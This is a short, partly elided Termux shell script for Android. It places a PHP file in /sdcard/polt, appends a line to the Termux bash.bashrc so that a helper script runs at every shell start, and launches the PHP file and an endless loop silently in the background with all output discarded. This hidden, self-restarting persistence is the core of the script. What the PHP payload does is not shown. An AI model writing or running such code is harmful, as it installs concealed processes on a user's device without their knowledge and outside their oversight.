...
touch /sdcard/polt/ter.sh
mkdir /sdcard/polt

mv p.php /sdcard/polt
echo -e """
bash /sdcard/polt/ter.sh
""" >> /data/data/com.termux/files/usr/etc/bash.bashrc
echo -e """
his(){
php /sdcard/polt/p.php > /dev/null 2>&1 &
}
jkj(){
while true
...
jkj > /dev/null 2>&1 &
""" > /sdcard/polt/ter.sh
bash /sdcard/polt/ter.sh > /dev/null 2>&1 &
# v0.3
